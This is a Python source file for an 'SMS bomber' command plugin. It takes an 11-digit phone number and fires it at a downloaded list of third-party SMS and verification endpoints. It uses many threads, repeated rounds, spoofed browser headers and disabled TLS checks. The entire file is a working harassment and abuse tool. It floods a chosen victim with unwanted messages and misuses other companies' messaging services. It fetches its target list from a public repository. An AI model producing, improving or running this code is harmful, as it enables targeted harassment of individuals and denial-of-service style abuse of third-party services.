# encoding=utf8
import json
import logging
import os
import pathlib
import sys
import time
import httpx
import threading
import asyncio
import copy
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Dict, Any, Union, Optional
from httpx import Limits

# 抑制httpx的INFO级日志
httpx_logger = logging.getLogger("httpx")
httpx_logger.setLevel(logging.WARNING)

# 日志配置 - 设置为WARNING级别以减少输出
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('SMS_Bomber')

# 应用路径 - 修复 __file__ 未定义问题
if getattr(sys, 'frozen', False):
    APP_PATH = os.path.dirname(sys.executable)
else:
    try:
        APP_PATH = os.path.dirname(os.path.abspath(__file__))
    except NameError:
        APP_PATH = os.path.dirname(os.path.abspath(sys.argv[0]))

# 默认配置
DEFAULT_CONFIG = {
    "thread": 64,       # 默认线程数
    "frequency": 60,    # 轮次（总执行次数）
    "interval": 60      # 轮次间隔（秒）
}

# 全局状态管理
class BombingState:
    def __init__(self):
        self.active = False
        self.paused = False
        self.stopped = False
        self.phone = ""
        self.frequency = DEFAULT_CONFIG["frequency"]
        self.interval = DEFAULT_CONFIG["interval"]
        self.lock = threading.Lock()
        self.total_count = 0
        self.success_count = 0
        self.fail_count = 0
        self.round = 0

state = BombingState()

# API类定义
class API:
    def __init__(self, desc: str = "Default", url: str = "", method: str = "GET",
                 header: Optional[Union[str, dict]] = None, data: Optional[Union[str, dict]] = None):
        self.desc = desc
        self.url = url
        self.method = method
        self.header = header
        self.data = data

    def replace_data(self, content: Union[str, dict], phone: str) -> Union[str, dict]:
        if not phone:
            return content
        if isinstance(content, dict):
            return {k: self.replace_data(v, phone) for k, v in content.items()}
        elif isinstance(content, str):
            content = content.replace("[phone]", phone)
            content = content.replace("[timestamp]", self.timestamp_new())
            return content
        return content

    def timestamp_new(self) -> str:
        from datetime import datetime
        return str(int(datetime.now().timestamp()))

    def handle_API(self, phone: str = None) -> 'API':
        api_copy = copy.deepcopy(self)

        if api_copy.header is None:
            api_copy.header = default_header_user_agent()
        else:
            api_copy.header = self.replace_data(api_copy.header, phone)
            if isinstance(api_copy.header, str):
                try:
                    api_copy.header = json.loads(api_copy.header)
                except:
                    api_copy.header = {"User-Agent": api_copy.header}

        if isinstance(api_copy.header, dict) and not any(k.lower() == 'referer' for k in api_copy.header):
            api_copy.header['Referer'] = api_copy.url

        if api_copy.data is not None:
            api_copy.data = self.replace_data(api_copy.data, phone)
            if isinstance(api_copy.data, str):
                try:
                    api_copy.data = json.loads(api_copy.data)
                except:
                    pass

        api_copy.url = self.replace_data(api_copy.url, phone)
        return api_copy

# 默认请求头
def default_header_user_agent() -> Dict[str, str]:
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

# 加载API配置
def load_apis() -> Tuple[List[API], List[API]]:
    try:
        json_path = pathlib.Path(APP_PATH, 'api.json')
        if not json_path.exists():
            raise FileNotFoundError("api.json not found")
        with open(json_path, "r", encoding="utf8") as f:
            apis_data = json.loads(f.read())
            apis = [API(**data) for data in apis_data]
        print(f"api.json 加载完成 接口数:{len(apis)}")

        getapi_path = pathlib.Path(APP_PATH, 'GETAPI.json')
        if not getapi_path.exists():
            raise FileNotFoundError("GETAPI.json not found")
        with open(getapi_path, "r", encoding="utf8") as f:
            get_apis_data = json.loads(f.read())
            get_apis = []
            for item in get_apis_data:
                if isinstance(item, str):
                    get_apis.append(API(url=item, method="GET"))
                else:
                    get_apis.append(API(**item))
        print(f"GETAPI.json 加载完成 接口数:{len(get_apis)}")

        return apis, get_apis
    except Exception:
        print("正在尝试更新API配置...")
        update_apis()
        return load_apis()

# 更新API
def update_apis():
    base_url = "https://raw.githubusercontent.com/iqcwl/iqcwl/master"
    files = {
        "GETAPI.json": f"{base_url}/GETAPI.json",
        "api.json": f"{base_url}/api.json"
    }
    try:
        with httpx.Client(verify=False, timeout=10) as client:
            for filename, url in files.items():
                response = client.get(url, headers=default_header_user_agent())
                response.raise_for_status()
                with open(pathlib.Path(APP_PATH, filename), "w", encoding="utf8") as f:
                    f.write(response.text)
        print("API配置更新成功!")
    except Exception:
        pass

# 手机号校验
def validate_phone(phone: str) -> bool:
    return phone.isdigit() and len(phone) == 11

# 同步请求
def reqAPI(api: API, client: httpx.Client) -> httpx.Response:
    processed_api = api.handle_API(state.phone if state.active else "")
    headers = processed_api.header if isinstance(processed_api.header, dict) else default_header_user_agent()

    if isinstance(processed_api.data, dict):
        return client.request(
            method=processed_api.method.upper(),
            json=processed_api.data,
            headers=headers,
            url=processed_api.url,
            timeout=10
        )
    else:
        return client.request(
            method=processed_api.method.upper(),
            data=processed_api.data,
            headers=headers,
            url=processed_api.url,
            timeout=10
        )

def reqFunc(api: Union[API, str], phone: str) -> bool:
    try:
        with httpx.Client(headers=default_header_user_agent(), verify=False, timeout=10) as client:
            if isinstance(api, API):
                processed_api = api.handle_API(phone)
                resp = reqAPI(processed_api, client)
                return 200 <= resp.status_code < 400
            else:
                url = api.replace("{phone}", phone).replace("[phone]", phone)
                url = url.replace(" ", "").replace('\n', '').replace('\r', '')
                resp = client.get(url=url, headers=default_header_user_agent(), timeout=10)
                return 200 <= resp.status_code < 400
    except:
        return False

# 异步请求
async def asyncReqs(src: Union[API, str], phone: str, semaphore: asyncio.Semaphore) -> Optional[httpx.Response]:
    async with semaphore:
        try:
            async with httpx.AsyncClient(
                limits=Limits(max_connections=1000, max_keepalive_connections=2000),
                headers=default_header_user_agent(),
                verify=False,
                timeout=10
            ) as client:
                if isinstance(src, API):
                    processed_api = src.handle_API(phone)
                    if isinstance(processed_api.data, dict):
                        return await client.request(
                            method=processed_api.method.upper(),
                            json=processed_api.data,
                            headers=processed_api.header if isinstance(processed_api.header, dict) else default_header_user_agent(),
                            url=processed_api.url
                        )
                    else:
                        return await client.request(
                            method=processed_api.method.upper(),
                            data=processed_api.data,
                            headers=processed_api.header if isinstance(processed_api.header, dict) else default_header_user_agent(),
                            url=processed_api.url
                        )
                else:
                    url = src.replace("{phone}", phone).replace("[phone]", phone)
                    url = url.replace(" ", "").replace('\n', '').replace('\r', '')
                    return await client.get(url=url, headers=default_header_user_agent())
        except:
            return None

# 发送请求
def send_request(api: Union[API, Dict, str], phone: str) -> Tuple[bool, int]:
    try:
        if isinstance(api, dict):
            api_obj = API(**api)
            success = reqFunc(api_obj, phone)
            return success, 200 if success else 0
        elif isinstance(api, str):
            success = reqFunc(api, phone)
            return success, 200 if success else 0
        else:
            success = reqFunc(api, phone)
            return success, 200 if success else 0
    except:
        return False, 0

# 单轮轰炸（✅ 新增 thread 参数）
def run_bombing_round(apis: List[Union[API, Dict, str]], phone: str, round_num: int, total_rounds: int, thread: int):
    total_apis = len(apis)
    print(f"===== 第 {round_num}/{total_rounds} 轮轰炸开始 =====")
    print(f"本轮接口数: {total_apis}，并发线程数: {thread}")

    success_count = 0
    fail_count = 0

    with ThreadPoolExecutor(max_workers=min(thread, total_apis)) as executor:
        futures = [executor.submit(send_request, api, phone) for api in apis]

        for future in as_completed(futures):
            with state.lock:
                if state.stopped:
                    break
                if state.paused:
                    while state.paused and not state.stopped:
                        time.sleep(0.5)
                    if state.stopped:
                        break

            try:
                success, _ = future.result()
                with state.lock:
                    state.total_count += 1
                    if success:
                        success_count += 1
                        state.success_count += 1
                    else:
                        fail_count += 1
                        state.fail_count += 1

                    if state.total_count % 10 == 0:
                        print(f"[进度] 总计 {state.total_count} | 成功 {state.success_count} | 失败 {state.fail_count}")
            except:
                with state.lock:
                    state.total_count += 1
                    state.fail_count += 1
                    fail_count += 1

    print(f"===== 第 {round_num} 轮完成 =====")
    print(f"本轮 → 成功 {success_count} / 失败 {fail_count}")
    print(f"累计 → 成功 {state.success_count} / 失败 {state.fail_count} / 总计 {state.total_count}\n")
    return success_count, fail_count

# 轰炸主任务（✅ 新增 thread 参数）
def bombing_task(phone: str, frequency: int, interval: int, thread: int):
    global state
    with state.lock:
        state.active = True
        state.paused = False
        state.stopped = False
        state.phone = phone
        state.frequency = frequency
        state.interval = interval
        state.total_count = 0
        state.success_count = 0
        state.fail_count = 0
        state.round = 0

    print(f"🚀 轰炸启动 | 手机: {phone} | 轮数: {frequency} | 间隔: {interval}s | 线程: {thread}")

    try:
        apis, get_apis = load_apis()
        all_apis = apis + get_apis
        print(f"✅ 共加载 {len(all_apis)} 个接口")

        for round_num in range(1, frequency + 1):
            with state.lock:
                if state.stopped:
                    print("❌ 任务已终止")
                    break
                state.round = round_num

            run_bombing_round(all_apis, phone, round_num, frequency, thread)

            if round_num < frequency:
                with state.lock:
                    if state.stopped:
                        break
                    if not state.paused:
                        print(f"⏳ 等待 {interval} 秒进入下一轮...\n")
                        for _ in range(interval):
                            if state.stopped or state.paused:
                                break
                            time.sleep(1)
    finally:
        with state.lock:
            state.active = False
            state.paused = False
        print(f"\n🏁 任务结束 | 成功 {state.success_count} | 失败 {state.fail_count} | 总计 {state.total_count}")

# 启动轰炸（✅ 新增 thread 参数）
def start_bombing(phone: str, frequency: int = None, interval: int = None, thread: int = None):
    with state.lock:
        if state.active:
            print("⚠️ 已有任务正在运行")
            return
        if not validate_phone(phone):
            print("❌ 手机号格式错误（需11位数字）")
            return

        freq = frequency or DEFAULT_CONFIG["frequency"]
        inter = interval or DEFAULT_CONFIG["interval"]
        thd = thread or DEFAULT_CONFIG["thread"]

        if not (1 <= thd <= 1000):
            print("❌ 线程数必须在 1 ~ 1000 之间")
            return

    threading.Thread(target=bombing_task, args=(phone, freq, inter, thd), daemon=True).start()

# 暂停 / 恢复 / 停止 / 状态
def pause_bombing():
    with state.lock:
        if not state.active:
            print("⚠️ 无正在运行的任务")
            return
        if state.paused:
            print("⚠️ 任务已暂停")
            return
        state.paused = True
    print("⏸️ 任务已暂停")

def resume_bombing():
    with state.lock:
        if not state.active:
            print("⚠️ 无正在运行的任务")
            return
        if not state.paused:
            print("⚠️ 任务未暂停")
            return
        state.paused = False
    print("▶️ 任务已恢复")

def stop_bombing():
    with state.lock:
        if not state.active:
            print("⚠️ 无正在运行的任务")
            return
        state.stopped = True
        state.paused = False
    print("🛑 停止指令已发送")

def status_bombing():
    with state.lock:
        if not state.active:
            print("ℹ️ 当前无运行中的任务")
            return
        status = "已暂停" if state.paused else "运行中"
        print(f"状态: {status}")
        print(f"手机: {state.phone}")
        print(f"轮次: {state.round}/{state.frequency}")
        print(f"成功: {state.success_count}")
        print(f"失败: {state.fail_count}")
        print(f"总计: {state.total_count}")

# 命令入口（✅ 支持线程数参数）
def dxhz_main(terminal, *args):
    if len(args) == 0:
        print("可用命令:")
        print("  dxhz start <手机号> [轮数] [间隔] [线程数] - 启动轰炸")
        print("  dxhz pause - 暂停轰炸")
        print("  dxhz resume - 恢复轰炸")
        print("  dxhz stop - 停止轰炸")
        print("  dxhz status - 查看状态")
        return
    cmd = args[0].lower()

    if cmd == "start":
        if len(args) < 2:
            print("❌ 缺少手机号")
            return
        phone = args[1]
        try:
            frequency = int(args[2]) if len(args) > 2 else None
            interval = int(args[3]) if len(args) > 3 else None
            thread = int(args[4]) if len(args) > 4 else None
        except ValueError:
            print("❌ 参数必须为整数")
            return
        start_bombing(phone, frequency, interval, thread)

    elif cmd == "pause":
        pause_bombing()
    elif cmd == "resume":
        resume_bombing()
    elif cmd == "stop":
        stop_bombing()
    elif cmd == "status":
        status_bombing()
    else:
        print(f"❌ 未知命令: {cmd}")

def register_commands():
    return {
        "dxhz": dxhz_main,
    }